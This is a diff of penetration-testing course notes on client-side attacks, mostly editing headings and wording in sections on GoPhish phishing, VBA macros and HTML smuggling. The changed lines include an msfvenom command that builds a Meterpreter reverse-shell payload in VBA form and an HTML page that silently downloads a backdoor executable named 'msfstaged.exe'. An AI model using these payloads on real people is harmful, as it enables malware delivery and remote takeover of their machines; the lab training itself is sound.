@@ -21,7 +21,7 @@
 	- HTML Application (HTA) Attacks (with MSFvenom)
 - Delivery and Execution
 	- File Smuggling with HTML and JavaScript (with MSFvenom)
-	- Initial Access via Spear Phishing Attachment (with MSFvenom)
+	- Initial Access via Spear Phishing Email Attachment (with MSFvenom)
 	- Client-Side Black-Box Penetration Test (with Nmap, MSFvenom, Metasploit)
 - Browser Attacks
 	- Browser-Based Attacks (with BeEF)
@@ -34,7 +34,7 @@
 
 ### Learning Objectives
 
-- You will have an understanding of what Client-Side attacks are and the various types of client-side attacks utilized for initial access.
+- You will have an understanding of what client-side attacks are and the various types of client-side attacks utilized for initial access.
 - You will be able to perform client-side information and fingerprinting in order to identify key info regarding a target's client-side configuration (browser, OS, etc.).
 - You will have a solid understanding of what Social Engineering is, the types of Social Engineering attacks used and the role of pretexting in successful social engineering campaigns.
 - You will be able to plan, deploy and manage phishing exercises/campaigns with tools like GoPhish.
@@ -792,7 +792,7 @@ GoPhish supports campaign scheduling and automation, allowing users to schedule 
 - [Gophish GitHub Repo](https://github.com/gophish/gophish)
 - [Gophish Installation Guide](https://docs.getgophish.com/user-guide/installation)
 
-### Let's Go Phishing with Gophish - Lab
+### Phishing with Gophish - Lab
 
 #### Lab Environment
 
@@ -1174,7 +1174,7 @@ The window style parameter controls how the program is displayed (hidden, minimi
 ##### Saving Macro-Enabled Documents
 
 When saving a document with macros, select:
-- "Word Macro-Enabled Document" (.docm) or
+- "Word Macro-Enabled Document" (.docm)
 - "Word 97-2003 Document" (.doc).
 
 ##### Running a Program on Document Open
@@ -1508,7 +1508,7 @@ Create VBA Macros with MSF.
 
 `cd /var/www/html`
 
-`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.42.23 LPORT=4444 -f vba-exe -o ./reverse_vba-psh.txt`:
+`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.42.23 LPORT=4444 -f vba-exe -o ./reverse_vba-exe.txt`:
 ```
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
@@ -2745,7 +2745,7 @@ HTML smuggling is often used to bypass security controls by hiding the malicious
 
 **Reconstruction and Execution:** Once the HTML content reaches the target's browser, the payload is reconstructed and executed. This could involve JavaScript logic to decode and reassemble the payload, leading to various outcomes, such as executing malicious scripts or downloading additional payloads.
 
-### Windows: File Smuggling with HTML and JavaScript (with MSFvenom) - Lab
+### File Smuggling with HTML and JavaScript (with MSFvenom) - Lab
 
 #### Lab Environment
 
@@ -2808,42 +2808,60 @@ Set up the malicious web server.
 <html>
     <body>
         <script>
+            // This function takes a base64-encoded string and converts it into an ArrayBuffer.
+            // It does so by decoding the base64 into binary data and then constructing a typed array (Uint8Array) from it.
             function base64ToArrayBuffer(base64) {
+                // Decode the base64-encoded string into binary
                 var binary_string = window.atob(base64);
                 var len = binary_string.length;
 
+                // Create a Uint8Array to hold the binary data
                 var bytes = new Uint8Array(len);
 
+                // Convert each character in the binary string into its corresponding byte value
                 for (var i = 0; i < len; i++) {
                     bytes[i] = binary_string.charCodeAt(i);
                 }
 
+                // Return the ArrayBuffer representation of the bytes
                 return bytes.buffer;
             }
 
-            var file = '';
+            // This is an empty base64 string. In a real scenario, this should be replaced with actual base64-encoded data.
+            var base64File = '';
 
-            var data = base64ToArrayBuffer(file);
-            var blob = new Blob([data], { type: 'octet/stream' });
+            // Convert the base64 string into an ArrayBuffer
+            var data = base64ToArrayBuffer(base64File);
+
+            // Create a Blob from the ArrayBuffer. The MIME type "application/octet-stream" indicates arbitrary binary data.
+            var blob = new Blob([data], { type: 'application/octet-stream' });
+
+            // Specify the file name for the downloaded file
             var fileName = 'msfstaged.exe';
 
+            // Create a temporary anchor element to initiate the download
             var a = document.createElement('a');
             document.body.appendChild(a);
+
+            // Hide the anchor so it doesn't affect the page layout
             a.style = 'display: none';
 
+            // Create a URL that references the Blob, allowing the browser to handle it as a downloadable file
             var url = window.URL.createObjectURL(blob);
             a.href = url;
-            a.download = fileName;
+            a.download = fileName; // Set the file name that will appear in the download
 
+            // Programmatically click the anchor to start the file download
             a.click();
 
+            // Revoke the temporary URL to free up memory
             window.URL.revokeObjectURL(url);
         </script>
     </body>
 </html>
 ```
 
-Note: Insert the base64 content from `backdoor_base64.txt` into the `file` variable in `index.html`.
+Note: Insert the base64 content from `backdoor_base64.txt` into the `base64File` variable in `index.html`.
 
 `service apache2 start`
 
@@ -2872,7 +2890,7 @@ Logged On Users : 1
 Meterpreter     : x86/windows
 ```
 
-### Initial Access via Spear Phishing Attachment (with MSFvenom) - Lab
+### Initial Access via Spear Phishing Email Attachment (with MSFvenom) - Lab
 
 #### Lab Solution
 
